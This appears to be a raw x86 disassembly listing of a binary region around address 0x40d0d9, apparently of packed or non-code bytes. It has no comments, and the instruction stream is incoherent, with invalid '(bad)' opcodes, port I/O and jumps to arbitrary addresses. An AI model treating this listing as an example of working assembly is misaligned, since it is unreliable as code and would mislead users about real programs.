  40d0d9:	xor    eax,0x9cbd990d
  40d0de:	xchg   edx,eax
  40d0df:	adc    ah,BYTE PTR [edx+0x3e]
  40d0e2:	mov    esi,0xa11c3a0f
  40d0e7:	mov    DWORD PTR [esi],esi
  40d0e9:	(bad)  
  40d0ea:	pop    eax
  40d0eb:	adc    edx,DWORD PTR [edi]
  40d0ed:	iret   
  40d0ee:	out    0xa3,al
  40d0f0:	push   0xfffffff9
  40d0f2:	xchg   BYTE PTR [edi],dh
  40d0f4:	add    dl,bh
  40d0f6:	lock pop edi
  40d0f8:	xlat   BYTE PTR ds:[ebx]
  40d0f9:	mov    ecx,0x8e1147b8
  40d0fe:	sub    DWORD PTR [ebx-0x52100200],edi
  40d104:	mov    ds:0x2e214ff0,eax
  40d109:	xadd   DWORD PTR [eax-0x7c],ecx
  40d10d:	adc    al,0x84
  40d10f:	jle    0x40d16e
  40d111:	loopne 0x40d100
  40d113:	fcomp  DWORD PTR [eax]
  40d115:	jmp    0x9be58122
  40d11a:	sub    DWORD PTR ds:0xbfd0d034,ebp
  40d120:	or     al,0x47
  40d122:	inc    esp
  40d123:	xlat   BYTE PTR ds:[ebx]
  40d124:	or     DWORD PTR [ebx],0x7a
  40d127:	popf   
  40d128:	and    BYTE PTR [esi-0x3450370c],0xc5
  40d12f:	imul   esi,DWORD PTR [ecx+esi*8+0x53],0x509f3cc8
  40d137:	dec    edx
  40d138:	cmp    eax,0x37dcaae9
  40d13d:	popa   
  40d13e:	pop    ebx
  40d13f:	ins    DWORD PTR es:[edi],dx
  40d140:	es in  al,dx
  40d142:	sub    edx,eax
  40d144:	pop    esp
  40d145:	lahf   
  40d146:	outs   dx,BYTE PTR ds:[esi]
  40d147:	loop   0x40d0cc
  40d149:	in     al,0xf5
  40d14b:	adc    dh,0x21
  40d14e:	jp     0x40d0d7
  40d150:	frstor [ebx]
  40d152:	pusha  
  40d153:	and    eax,0xc86a50fd
  40d158:	jmp    0x40d109
  40d15a:	mov    bh,0x80
  40d15c:	mov    al,0xf4
  40d15e:	inc    ebp
  40d15f:	hlt    
  40d160:	jge    0x40d133
  40d162:	lahf   
  40d163:	(bad)  
  40d164:	xchg   edx,eax
  40d165:	add    DWORD PTR [edx],ecx
  40d167:	test   BYTE PTR [ecx-0x1c],cl
  40d16a:	arpl   WORD PTR [edx],bx
  40d16c:	lock popf 
  40d16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d16f:	daa    
  40d170:	sbb    eax,0xf4c16833
  40d175:	fdiv   DWORD PTR [edx]
  40d177:	ins    BYTE PTR es:[edi],dx
  40d178:	rcl    ch,0x13
  40d17b:	not    BYTE PTR [eax+eiz*8]
  40d17e:	cs test esi,0xbeb05e1
  40d185:	mov    al,0x9f
  40d187:	data16 out dx,al
  40d189:	scas   eax,DWORD PTR es:[edi]
  40d18a:	leave  
  40d18b:	imul   edi,ebx,0x5
  40d18e:	dec    edi
  40d18f:	es shl ebx,cl
  40d192:	dec    ebx
  40d193:	dec    esi
  40d194:	in     eax,dx
  40d195:	inc    ecx
  40d196:	add    al,0xa
  40d198:	dec    edi
  40d199:	div    BYTE PTR [eax]
  40d19b:	and    al,0xa7
  40d19d:	out    dx,al
  40d19e:	pop    ebx
  40d19f:	jne    0x40d206
  40d1a1:	inc    eax
  40d1a2:	xchg   ebx,eax
  40d1a3:	mov    al,0x7d
  40d1a5:	jge    0x40d1c9
  40d1a7:	pop    esi
  40d1a8:	mov    esp,0x3dfbaa58
  40d1ad:	popa   
  40d1ae:	add    eax,0xb8252691
  40d1b3:	xor    ebx,DWORD PTR ds:0x3534e18e
  40d1b9:	pop    ds
  40d1ba:	test   edi,edx
  40d1bc:	xchg   ebx,eax
  40d1bd:	pop    ebp
  40d1be:	pop    edx
  40d1bf:	pop    ds
  40d1c0:	in     eax,0xf8
  40d1c2:	sar    DWORD PTR [edi-0x221fbe3f],cl
  40d1c8:	push   0xd
  40d1ca:	sub    DWORD PTR [edx+0x2],0x2b2295e7
  40d1d1:	enter  0xdbcc,0x7b
  40d1d5:	lods   al,BYTE PTR ds:[esi]
  40d1d6:	mov    edx,0xd4603f8e
  40d1db:	fsub   QWORD PTR [ebp-0x28]
  40d1de:	imul   ecx,DWORD PTR [ebp-0x6f],0x65
  40d1e2:	cmp    al,0x7e
  40d1e4:	repnz fisub DWORD PTR [esi]
  40d1e7:	stc    
  40d1e8:	test   al,0x15
  40d1ea:	push   es
  40d1eb:	jbe    0x40d193
  40d1ed:	pop    edi
  40d1ee:	sub    BYTE PTR [ebx],bh
  40d1f0:	gs neg cl
  40d1f3:	xor    ebx,DWORD PTR ds:0x5b6fdddb
  40d1f9:	ja     0x40d201
  40d1fb:	arpl   WORD PTR [ebx-0x26],sp
  40d1fe:	mov    bh,0xdd
  40d200:	adc    BYTE PTR [edi],dh
  40d202:	je     0x40d251
  40d204:	sub    DWORD PTR [edx],esi
  40d206:	mov    eax,fs
  40d208:	and    DWORD PTR [ecx+0x23],eax
  40d20b:	xor    al,BYTE PTR [ebp-0x60edd3d8]
  40d211:	adc    al,0x5d
  40d213:	out    0x28,eax
  40d215:	pop    esi
  40d216:	and    edx,edi
  40d218:	es pop esp
  40d21a:	pop    ds
  40d21b:	lods   eax,DWORD PTR ds:[esi]
  40d21c:	out    0x24,eax
  40d21e:	loop   0x40d289
  40d220:	idiv   DWORD PTR [eax]
  40d222:	sbb    DWORD PTR [ebp-0xc05dbf0],ebp
  40d228:	jbe    0x40d238
  40d22a:	inc    ebx
  40d22b:	ins    BYTE PTR es:[edi],dx
  40d22c:	mov    eax,0xe3cec34b
  40d231:	jmp    0x3014:0xbade4bb
  40d238:	into   
  40d239:	not    BYTE PTR [edi]
  40d23b:	lods   al,BYTE PTR ds:[esi]
  40d23c:	xor    edx,DWORD PTR [edx]
  40d23e:	jecxz  0x40d258
  40d240:	push   es
  40d241:	jae    0x40d2b8
  40d243:	lock mov cl,0xd6
  40d246:	es dec edi
  40d248:	push   0xffffffc2
  40d24a:	adc    DWORD PTR ds:0x41bb153e,ebx
  40d250:	jecxz  0x40d27d
  40d252:	out    0xbc,eax
  40d254:	and    eax,0xbd54cda0
  40d259:	adc    DWORD PTR [esp+esi*1-0x7568c4c2],ebp
  40d260:	jne    0x40d29b
  40d262:	push   esp
  40d263:	adc    DWORD PTR [ebp-0x45],esi
  40d266:	cs sub al,0x7f
  40d269:	outs   dx,DWORD PTR ds:[esi]
  40d26a:	lea    edi,[ebx-0x4]
  40d26d:	repz in eax,0x1e
  40d270:	sub    BYTE PTR [edx+0x6d4ff284],dh
  40d276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d277:	ss sti 
  40d279:	fbstp  TBYTE PTR [ecx+0x4b]
  40d27c:	inc    edi
  40d27d:	sub    eax,0xe708b846
  40d282:	iret   
  40d283:	daa    
  40d284:	xchg   ecx,eax
  40d285:	jp     0x40d298
  40d287:	das    
  40d288:	push   esi
  40d289:	mov    esp,0x3681c8cc
  40d28e:	cmp    DWORD PTR [eax+0x65f2a215],esi
  40d294:	or     ebx,esi
  40d296:	fwait
  40d297:	bound  ebx,QWORD PTR [edi+ebp*2-0x3b]
  40d29b:	push   es
  40d29c:	enter  0x76aa,0x54
  40d2a0:	retf   0x7b67
  40d2a3:	push   ebp
  40d2a4:	dec    ebx
  40d2a5:	sub    BYTE PTR [edi+0xc560519],0x60
  40d2ac:	repz fcomp QWORD PTR [ebp-0x6a]
  40d2b0:	aaa    
  40d2b1:	imul   esi,DWORD PTR [ecx],0x59
  40d2b4:	mov    BYTE PTR [eax-0x64],al
  40d2b7:	adc    BYTE PTR [esp+esi*4],cl
  40d2ba:	dec    ebx
  40d2bb:	loopne 0x40d318
  40d2bd:	inc    ecx
  40d2be:	cs and eax,0xa8d52ff4
  40d2c4:	sub    al,0xdd
  40d2c6:	mov    bl,0x80
  40d2c8:	das    
  40d2c9:	(bad)  
  40d2ca:	leave  
  40d2cb:	mov    ds:0x358e29ab,eax
  40d2d0:	rcr    DWORD PTR [ecx+0x7ed2bcf2],1
  40d2d6:	gs dec edx
  40d2d8:	pop    ebp
  40d2d9:	xchg   ebx,eax
  40d2da:	les    edx,FWORD PTR [edx]
  40d2dc:	pushf  
  40d2dd:	mov    ah,0x3b
  40d2df:	xchg   ebp,eax
  40d2e0:	(bad)  
  40d2e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e2:	dec    esp
  40d2e3:	push   cs
  40d2e4:	pop    es
  40d2e5:	push   ecx
  40d2e6:	xchg   cl,ah
  40d2e8:	add    cl,BYTE PTR [ebx]
  40d2ea:	jmp    0x587c865b
  40d2ef:	push   ds
  40d2f0:	daa    
  40d2f1:	pop    edx
  40d2f2:	fidiv  DWORD PTR [edx-0x5796e268]
  40d2f8:	ss pushf 
  40d2fa:	clc    
  40d2fb:	jmp    0xf7e7802c
  40d300:	adc    BYTE PTR gs:[esi],al
  40d303:	test   dh,bl
  40d305:	xor    BYTE PTR [eax-0x56],0x8e
  40d309:	adc    eax,DWORD PTR [edx-0x3b7e71c8]
  40d30f:	xchg   ebx,eax
  40d310:	cmp    DWORD PTR [eax-0x36],0x51
  40d314:	jl     0x40d298
  40d316:	adc    eax,0x65cfb537
  40d31b:	or     esi,DWORD PTR [eax]
  40d31d:	inc    esi
  40d31e:	or     eax,0x1f46a1c1
  40d323:	push   edi
  40d324:	out    0x56,eax
  40d326:	shl    BYTE PTR [ecx+0x3d0a831d],0x16
  40d32d:	stos   DWORD PTR es:[edi],eax
  40d32e:	push   es
  40d32f:	cmc    
  40d330:	nop
  40d331:	aaa    
  40d332:	rol    DWORD PTR [ecx],1
  40d334:	jp     0x40d2f3
  40d336:	jnp    0x40d326
  40d338:	inc    esp
  40d339:	jae    0x40d305
  40d33b:	inc    edx
  40d33c:	xor    BYTE PTR [ecx+0x22fb4f9e],cl
  40d342:	pop    ebp
  40d343:	mov    WORD PTR [edx+0x7cd99d55],fs
  40d349:	int3   
  40d34a:	retf   
  40d34b:	dec    esp
  40d34c:	ret    0xd9ce
  40d34f:	or     al,BYTE PTR cs:[edi+0x44]
  40d353:	pusha  
  40d354:	inc    ebx
  40d355:	loop   0x40d2f4
  40d357:	inc    ebp
  40d358:	xor    edi,0xeb41b5fa
  40d35e:	dec    esi
  40d35f:	leave  
  40d360:	inc    eax
  40d361:	xchg   esp,eax
  40d362:	fidiv  DWORD PTR [ecx]
  40d364:	jbe    0x40d319
  40d366:	dec    esp
  40d367:	sbb    eax,0xb3cd518e
  40d36c:	into   
  40d36d:	dec    edi
  40d36e:	xchg   ecx,eax
  40d36f:	sti    
  40d370:	or     al,0x2d
  40d372:	ret    
  40d373:	(bad)  
  40d375:	in     eax,dx
  40d376:	fld    TBYTE PTR [ecx-0x5]
  40d379:	xor    BYTE PTR [ebx+eiz*2-0x4e6f0160],0x43
  40d381:	aaa    
  40d382:	and    dh,BYTE PTR [ebp+0x41d0b691]
  40d388:	xor    edx,DWORD PTR [eax]
  40d38a:	fld    DWORD PTR [ebx-0x5f]
  40d38d:	pop    ss
  40d38e:	retf   0x6c14
  40d391:	pop    ebp
  40d392:	hlt    
  40d393:	fs adc esi,ecx
  40d396:	out    dx,eax
  40d397:	test   al,0x4d
  40d399:	imul   esi,DWORD PTR [ebp-0x6c],0xffffff8d
  40d39d:	cli    
  40d39e:	popa   
  40d39f:	leave  
  40d3a0:	call   0xb8ac20c8
  40d3a5:	add    eax,0x9cbce8fc
  40d3aa:	loop   0x40d3ea
  40d3ac:	push   0xa00b5355
  40d3b1:	sub    esi,esi
  40d3b3:	por    mm7,mm0
  40d3b6:	pop    edi
  40d3b7:	dec    ebx
  40d3b8:	jne    0x40d435
  40d3ba:	sub    al,0x97
  40d3bc:	shl    DWORD PTR [edx+esi*4+0x18],1
  40d3c0:	inc    edi
  40d3c1:	shl    cl,0xe4
  40d3c4:	iret   
  40d3c5:	repnz nop
  40d3c7:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40d3c9:	loopne 0x40d391
  40d3cb:	(bad)  
  40d3cc:	mov    ecx,0xee6c5541
  40d3d1:	arpl   WORD PTR [ecx],dx
  40d3d3:	je     0x40d404
  40d3d5:	push   ebp
  40d3d6:	add    al,0x3d
  40d3d8:	mov    ch,0x44
  40d3da:	mov    BYTE PTR ss:[edi+0x19],bl
  40d3de:	int    0x7c
  40d3e0:	hlt    
  40d3e1:	xchg   esp,eax
  40d3e2:	loope  0x40d40a
  40d3e4:	(bad)  
  40d3e6:	xchg   edi,eax
  40d3e7:	stc    
  40d3e8:	dec    ebx
  40d3e9:	cwde   
  40d3ea:	ins    DWORD PTR es:[edi],dx
  40d3eb:	inc    eax
  40d3ec:	mov    ?,WORD PTR [edx+0x439267d]
  40d3f2:	push   edi
  40d3f3:	jo     0x40d3fb
  40d3f5:	fnsave [edi]
  40d3f7:	pop    ss
  40d3f8:	in     al,dx
  40d3f9:	xchg   edx,eax
  40d3fa:	cmc    
  40d3fb:	mov    edx,0x74e5c838
  40d400:	mov    cl,0xcf
  40d402:	imul   edx,DWORD PTR [ebp-0x7f],0x4d8560e3
  40d409:	adc    dl,bl
  40d40b:	or     bh,BYTE PTR ds:0x3cab77ed
  40d411:	pop    es
  40d412:	sbb    ch,BYTE PTR [ebp-0x2e]
  40d415:	add    DWORD PTR [edx],ecx
  40d417:	cdq    
  40d418:	fs popa 
  40d41a:	push   0x4e
  40d41c:	sbb    BYTE PTR [ecx+0x437a142a],dl
  40d422:	xchg   esp,eax
  40d423:	cwde   
  40d424:	pop    esi
  40d425:	ret    0x776a
  40d428:	dec    eax
  40d429:	sub    DWORD PTR [edx-0x79],0x53
  40d42d:	not    ecx
  40d42f:	dec    esi
  40d430:	cld    
  40d431:	jnp    0x40d45b
  40d433:	dec    ebp
  40d434:	xor    esp,esi
  40d436:	xor    edi,DWORD PTR [ebp+0x5c]
  40d439:	pop    edi
  40d43a:	sub    DWORD PTR [eax],esi
  40d43c:	out    dx,al
  40d43d:	inc    eax
  40d43e:	fild   QWORD PTR [ecx+0x48ace7e8]
  40d444:	pop    esp
  40d445:	mov    dl,0x9f
  40d447:	mov    ds:0x334d767d,al
  40d44c:	inc    edx
  40d44d:	xor    ebx,DWORD PTR [ecx+0x5e9d2bce]
  40d453:	(bad)  
  40d454:	ins    DWORD PTR es:[edi],dx
  40d455:	es inc esi
  40d457:	fstp   TBYTE PTR [eax]
  40d459:	fstp   st(3)
  40d45b:	fistp  WORD PTR [eax]
  40d45d:	and    eax,0x6e553387
  40d462:	pop    esi
  40d463:	outs   dx,BYTE PTR ds:[esi]
  40d464:	pop    edx
  40d465:	and    al,0x95
  40d467:	push   cs
  40d468:	ror    BYTE PTR [ebx-0x68cd6f62],0x76
  40d46f:	ret    
  40d470:	(bad)  
  40d471:	imul   esi,ecx,0xffffffa9
  40d474:	jbe    0x40d4cc
  40d476:	fwait
  40d477:	jne    0x40d483
  40d479:	xchg   ebp,eax
  40d47a:	in     al,dx
  40d47b:	pop    ebx
  40d47c:	dec    esi
  40d47d:	xor    al,ch
  40d47f:	call   0xaf315d69
  40d484:	int3   
  40d485:	gs retf 
  40d487:	sbb    ebp,DWORD PTR [esi+0x31]
  40d48a:	inc    ebp
  40d48b:	sahf   
  40d48c:	das    
  40d48d:	ds dec ebp
  40d48f:	lock aaa 
  40d491:	jmp    0x9578:0x3e8ed539
  40d498:	icebp  
  40d499:	(bad)  
  40d49a:	arpl   si,cx
  40d49c:	arpl   WORD PTR [ebx],sp
  40d49e:	lds    esp,FWORD PTR [ecx-0x1b]
  40d4a1:	push   ds
  40d4a2:	in     al,0xed
  40d4a4:	mov    ebx,0xbb167ceb
  40d4a9:	cmp    eax,0x4ff4f684
  40d4ae:	dec    ebx
  40d4af:	pop    ds
  40d4b0:	push   ss
  40d4b1:	add    DWORD PTR [ecx],eax
  40d4b3:	jae    0x40d529
  40d4b5:	pop    ebx
  40d4b6:	mov    al,0xe6
  40d4b8:	jmp    0x40d4b9
  40d4ba:	jbe    0x40d514
  40d4bc:	or     BYTE PTR [ebx+ebx*8],ch
  40d4bf:	lea    esi,[ebx-0xc04f3f5]
  40d4c5:	iret   
  40d4c6:	inc    ebp
  40d4c7:	pushfw 
  40d4c9:	jno    0x40d46f
  40d4cb:	xchg   esp,eax
  40d4cc:	ret    
  40d4cd:	int    0x64
  40d4cf:	(bad)
  40d4d2:	push   ds
  40d4d3:	(bad)  
  40d4d4:	call   0x9fbd707a
  40d4d9:	popf   
  40d4da:	das    
  40d4db:	adc    DWORD PTR [ebx],ebx
  40d4dd:	cwde   
  40d4de:	ret    0xb4f
  40d4e1:	dec    esp
  40d4e2:	enter  0xa614,0xc6
  40d4e6:	push   esp
  40d4e7:	out    0xae,eax
  40d4e9:	xchg   esi,eax
  40d4ea:	jb     0x40d54e
  40d4ec:	fld    TBYTE PTR [edi]
  40d4ee:	jne    0x40d520
  40d4f0:	lods   eax,DWORD PTR ds:[esi]
  40d4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f2:	adc    eax,0xbfc3931d
  40d4f7:	retf   
  40d4f8:	pop    es
  40d4f9:	mov    edi,0xbefdbfb2
  40d4fe:	pop    ecx
  40d4ff:	push   ecx
  40d500:	add    DWORD PTR [edx],esp
  40d502:	sub    eax,0xe96165e2
  40d507:	add    al,0xc0
  40d509:	sub    ch,BYTE PTR [eax-0x3e06c5c7]
  40d50f:	cs mov edx,0x7c7b4cca
  40d515:	push   ss
  40d516:	lds    edi,FWORD PTR [ecx+0x5f]
  40d519:	mov    al,0x51
  40d51b:	imul   eax,DWORD PTR [edx],0xa7bcee72
  40d521:	das    
  40d522:	add    al,0x1c
  40d524:	jg     0x40d4d5
  40d526:	je     0x40d50a
  40d528:	cwde   
  40d529:	retf   
  40d52a:	jle    0x40d523
  40d52c:	mov    esp,edi
  40d52e:	fwait
  40d52f:	in     eax,dx
  40d530:	test   DWORD PTR [ecx-0x4ff9c60e],esp
  40d536:	and    eax,0xefe433b7
  40d53b:	enter  0xc775,0xaa
  40d53f:	scas   al,BYTE PTR es:[edi]
  40d540:	sbb    BYTE PTR [edx-0x2732f046],cl
  40d546:	dec    esp
  40d547:	(bad)  [ebp+0x74d46395]
  40d54d:	jle    0x40d4f8
  40d54f:	nop
  40d550:	lahf   
  40d551:	sahf   
  40d552:	adc    al,0x8a
  40d554:	fidiv  WORD PTR [edi+0x15]
  40d557:	jg     0x40d4e4
  40d559:	mov    ah,0xc1
  40d55b:	outs   dx,BYTE PTR ds:[esi]
  40d55c:	aad    0xdb
  40d55e:	jae    0x40d59d
  40d560:	mov    al,0xbf
  40d562:	mov    ebp,DWORD PTR [eax-0x53]
  40d565:	mov    edi,0x8225bf35
  40d56a:	mov    WORD PTR [eax],cs
  40d56c:	push   ebx
  40d56d:	fs test eax,0x4ce6f215
  40d573:	xor    ah,BYTE PTR [edi+0x5ece8e49]
  40d579:	sbb    eax,0x86365efd
  40d57e:	and    dl,BYTE PTR [ecx+ecx*1-0x7]
  40d582:	mov    al,0x62
  40d584:	ret    0xaab8
  40d587:	mov    ah,0x80
  40d58a:	adc    al,0x1c
  40d58c:	in     al,0x47
  40d58e:	sbb    WORD PTR [edi],ax
  40d591:	pushf  
  40d592:	ret    
  40d593:	xchg   DWORD PTR [esi],esi
  40d595:	push   esp
  40d596:	adc    ebx,DWORD PTR [edi]
  40d598:	xor    al,0x99
  40d59a:	retf   
  40d59b:	lock mov bh,0x9d
  40d59e:	cld    
  40d59f:	loop   0x40d585
  40d5a1:	js     0x40d5d7
  40d5a3:	mov    dh,0x4
  40d5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5a6:	mov    ah,dl
  40d5a8:	mov    ss,WORD PTR [eax+ebx*2+0x4b]
  40d5ac:	xchg   esp,eax
  40d5ad:	stc    
  40d5ae:	jns    0x40d5e0
  40d5b0:	mov    bh,0x7c
  40d5b2:	adc    ebp,DWORD PTR [ebx+ebx*4]
  40d5b5:	outs   dx,BYTE PTR ss:[esi]
  40d5b7:	mov    ds:0x586f3ae1,al
  40d5bc:	push   esi
  40d5bd:	add    DWORD PTR [ebp+0xf],ebx
  40d5c0:	push   cs
  40d5c1:	and    BYTE PTR [esi+0x2a1a54ba],dh
  40d5c7:	push   ss
  40d5c8:	mov    ebp,0x596960d8
  40d5cd:	fcmovb st,st(1)
  40d5cf:	sbb    ebp,DWORD PTR ds:0x8ccfb9d9
  40d5d5:	(bad)  
  40d5d6:	(bad)
  40d5db:	nop
  40d5dc:	jo     0x40d62f
  40d5de:	retf   
  40d5df:	popa   
  40d5e0:	adc    DWORD PTR [ebx-0x45512e97],edi
  40d5e6:	pop    edi
  40d5e7:	push   esp
  40d5e8:	sub    al,0x77
  40d5ea:	jns    0x40d583
  40d5ec:	sub    BYTE PTR [edi-0x25],bh
  40d5ef:	jo     0x40d59c
  40d5f1:	or     BYTE PTR [ebx-0x54],bh
  40d5f4:	stos   BYTE PTR es:[edi],al
  40d5f5:	lahf   
  40d5f6:	loop   0x40d632
  40d5f8:	xchg   ebp,eax
  40d5f9:	mov    ebp,0xaeb6e2fc
  40d5fe:	shl    edx,cl
  40d600:	setns  BYTE PTR [esi+0x6e]
  40d604:	hlt    
  40d605:	mov    dl,0xe
  40d607:	icebp  
  40d608:	mov    eax,0x65241777
  40d60d:	call   0x890d9b48
  40d612:	and    BYTE PTR [esi],dh
  40d614:	popf   
  40d615:	pop    edi
  40d616:	mov    WORD PTR [ecx],cs
  40d618:	push   esi
  40d619:	mov    dl,0xd7
  40d61b:	enter  0x3679,0xe4
  40d61f:	fwait
  40d620:	jmp    0x9c8cc47f
  40d625:	push   cs
  40d626:	leave  
  40d627:	mov    bl,0x95
  40d629:	lods   al,BYTE PTR ds:[esi]
  40d62a:	push   esp
  40d62b:	idiv   DWORD PTR [edx+0x43]
  40d62e:	adc    dl,ch
  40d630:	popa   
  40d631:	push   esi
  40d632:	cmp    bl,BYTE PTR [esp+edx*4+0x56]
  40d636:	retf   0x915b
  40d639:	mov    WORD PTR [esi+0x3c],fs
  40d63c:	and    cl,BYTE PTR [ecx+0x3f2fbc45]
  40d642:	cmp    DWORD PTR [esi+esi*1],ebp
  40d645:	(bad)  
  40d646:	(bad)  
  40d647:	nop
  40d648:	icebp  
  40d649:	repnz fild QWORD PTR [esi-0x4a]
  40d64d:	add    eax,0x6f5478a
  40d652:	xchg   esp,eax
  40d653:	push   ds
  40d654:	xor    BYTE PTR [ebp+0x591ecba5],bh
  40d65a:	das    
  40d65b:	cmp    al,0x82
  40d65d:	or     esi,DWORD PTR [esi+0x7a9cb5d5]
  40d663:	(bad)  
  40d664:	adc    BYTE PTR [ebx+0x260d5ae9],cl
  40d66a:	cld    
  40d66b:	int3   
  40d66c:	out    dx,eax
  40d66d:	fwait
  40d66e:	outs   dx,DWORD PTR ds:[esi]
  40d66f:	gs in  eax,0x4a
  40d672:	mov    esi,0x1ede39dd
  40d677:	adc    BYTE PTR [ebx-0x29],0xf0
  40d67b:	aad    0x77
  40d67d:	loop   0x40d634
  40d67f:	ret    
  40d680:	jp     0x40d612
  40d682:	push   esp
  40d683:	mov    ebx,0x9b597637
  40d688:	aam    0x5
  40d68a:	pop    ds
  40d68b:	loopne 0x40d6e9
  40d68d:	mov    ebp,0x81df8306
  40d692:	mov    ecx,0x835ee478
  40d697:	js     0x40d6ba
  40d699:	add    eax,0x4001e13e
  40d69e:	loopne 0x40d683
  40d6a0:	test   ebx,esi
  40d6a2:	lds    esp,FWORD PTR [ebp+ecx*1+0x3e]
  40d6a6:	mov    ch,0x57
  40d6a8:	xlat   BYTE PTR ds:[ebx]
  40d6a9:	stos   BYTE PTR es:[edi],al
  40d6aa:	jo     0x40d6b4
  40d6ac:	cwde   
  40d6ad:	sbb    al,0x49
  40d6af:	(bad)  
  40d6b0:	cmc    
  40d6b1:	mov    ?,WORD PTR [esi-0x36db1a06]
  40d6b7:	mov    edi,edi
  40d6b9:	pop    ebp
  40d6ba:	ret    0x1a78
  40d6bd:	sbb    ah,dh
  40d6bf:	sub    ebp,DWORD PTR ss:[ebx+0xd1b88b3]
  40d6c6:	mov    edi,0xa5fd0ee
  40d6cb:	dec    esi
  40d6cc:	outs   dx,BYTE PTR ds:[esi]
  40d6cd:	mov    esp,0x38830226
  40d6d2:	xchg   edx,eax
  40d6d3:	cmp    esi,DWORD PTR [eax+0xd7e4cf8]
  40d6d9:	add    al,0x3
  40d6db:	mov    ds,WORD PTR [edi-0x27]
  40d6de:	out    0x0,al
  40d6e0:	push   edi
  40d6e1:	sbb    eax,0x35a5b70
  40d6e6:	lds    esp,FWORD PTR [esi+0x7f87fd8f]
  40d6ec:	loop   0x40d6e1
  40d6ee:	repnz sbb dl,0xd7
  40d6f2:	inc    edx
  40d6f3:	or     al,0xf6
  40d6f5:	mov    ds:0xfe2c9975,al
  40d6fa:	or     esp,DWORD PTR [esi-0x6f]
  40d6fd:	jmp    0x40d735
  40d6ff:	mov    ah,0xa2
  40d701:	sbb    al,0x94
  40d703:	retf   
  40d704:	into   
  40d705:	pop    ecx
  40d706:	dec    edi
  40d707:	jae    0x40d69e
  40d709:	pop    edi
  40d70a:	jno    0x40d781
  40d70c:	repnz pop ecx
  40d70e:	les    ebx,FWORD PTR [ebx+0x52f356c]
  40d714:	clc    
  40d715:	es jmp 0x5afc:0x1cc9cbf1
  40d71d:	jns    0x40d6bd
  40d71f:	mov    eax,0x294e2bc2
  40d724:	aam    0xa8
  40d726:	fs push 0xffffffb4
  40d729:	retf   
  40d72a:	mov    ds:0xf1ec47f3,eax
  40d72f:	scas   eax,DWORD PTR es:[edi]
  40d730:	stc    
  40d731:	pop    ecx
  40d732:	stc    
  40d733:	mov    al,0x0
  40d735:	test   DWORD PTR [esi],ecx
  40d737:	pop    ecx
  40d738:	inc    edi
  40d739:	lods   eax,DWORD PTR ds:[esi]
  40d73a:	mov    ebx,0x9ec6e19b
  40d73f:	jns    0x40d6d3
  40d741:	addr16 push edi
  40d743:	out    0x9e,al
  40d745:	push   eax
  40d746:	xor    eax,ebp
  40d748:	mov    ds:0x70f7d53c,eax
  40d74d:	or     bh,ah
  40d74f:	in     al,0x66
  40d751:	push   ss
  40d752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d753:	push   ecx
  40d754:	dec    eax
  40d755:	repz push ebx
  40d757:	lods   al,BYTE PTR ds:[esi]
  40d758:	rol    DWORD PTR [ecx+0xf7de389],cl
  40d75e:	pusha  
  40d75f:	pop    ds
  40d760:	popa   
  40d761:	xchg   esp,eax
  40d762:	push   ecx
  40d763:	test   al,0x24
  40d765:	mov    edx,0x4cb37f7a
  40d76a:	mov    edi,0xa4b1dc72
  40d76f:	bnd jne 0x40d6ff
  40d772:	sub    BYTE PTR [edi+0x48],dl
  40d775:	lods   eax,DWORD PTR ds:[esi]
  40d776:	mov    al,0x9a
  40d778:	cs push ebx
  40d77a:	inc    esp
  40d77b:	test   al,0x78
  40d77d:	xchg   esi,eax
  40d77e:	les    edi,FWORD PTR [ecx-0x34b5c9e6]
  40d784:	jae    0x40d791
  40d786:	mov    dh,0xd8
  40d788:	mov    dh,0xc0
  40d78a:	adc    BYTE PTR [eax+0x57],dl
  40d78d:	sbb    edx,DWORD PTR [ecx]
  40d78f:	hlt    
  40d790:	out    0x49,eax
  40d792:	cmp    BYTE PTR [eax+0x76],0x2d
  40d796:	or     dh,BYTE PTR [eax-0x2b]
  40d799:	push   eax
  40d79a:	ror    ebx,1
  40d79c:	inc    edi
  40d79d:	xchg   al,dh
  40d79f:	jbe    0x40d763
  40d7a1:	mov    eax,ds:0x6e859f01
  40d7a6:	mov    edi,0xba2405e6
  40d7ab:	xor    esp,DWORD PTR [eax]
  40d7ad:	test   eax,0x730bf3be
  40d7b2:	scas   al,BYTE PTR es:[edi]
  40d7b3:	pop    ds
  40d7b4:	pop    ebp
  40d7b5:	push   esp
  40d7b6:	xchg   esi,edx
  40d7b8:	jo     0x40d837
  40d7ba:	pushf  
  40d7bb:	outs   dx,DWORD PTR ds:[esi]
  40d7bc:	xor    BYTE PTR ds:0x3a196196,0x42
  40d7c3:	int    0x9e
  40d7c5:	fs push ebp
  40d7c7:	aas    
  40d7c8:	jge    0x40d796
  40d7ca:	ret    0x5418
  40d7cd:	cmp    dl,ah
  40d7cf:	push   esi
  40d7d0:	call   0x82d16682
  40d7d5:	mov    ds:0xe851d9da,al
  40d7da:	je     0x40d7d5
  40d7dc:	fst    DWORD PTR [eax]
  40d7de:	call   0x574a:0x816ecedc
  40d7e5:	retf   
  40d7e6:	adc    al,0x75
  40d7e8:	push   ebp
  40d7e9:	cld    
  40d7ea:	xchg   ebx,eax
  40d7eb:	stos   BYTE PTR es:[edi],al
  40d7ec:	sar    BYTE PTR [ecx-0x1d9dc63c],1
  40d7f2:	mov    ch,0x54
  40d7f4:	sti    
  40d7f5:	ficom  WORD PTR [esi+esi*4]
  40d7f8:	add    esp,DWORD PTR [ecx+0xf]
  40d7fb:	arpl   WORD PTR [ecx-0x241aea2f],dx
  40d801:	push   esp
  40d802:	and    esi,DWORD PTR [ecx+ebp*4]
  40d805:	pusha  
  40d806:	inc    edx
  40d807:	add    dl,BYTE PTR [ebx+0x28]
  40d80a:	sbb    esp,DWORD PTR [ebp+edx*8+0x2f]
  40d80e:	mov    eax,0x29f782d0
  40d813:	fsubrp st(6),st
  40d815:	and    al,0x75
  40d817:	pop    ebx
  40d818:	sub    BYTE PTR [ecx+ebx*2+0x7daf2ed6],dl
  40d81f:	xchg   edi,eax
  40d820:	jp     0x40d7fc
  40d822:	xor    ecx,ebx
  40d824:	adc    DWORD PTR [esi],ebx
  40d826:	out    dx,eax
  40d827:	stc    
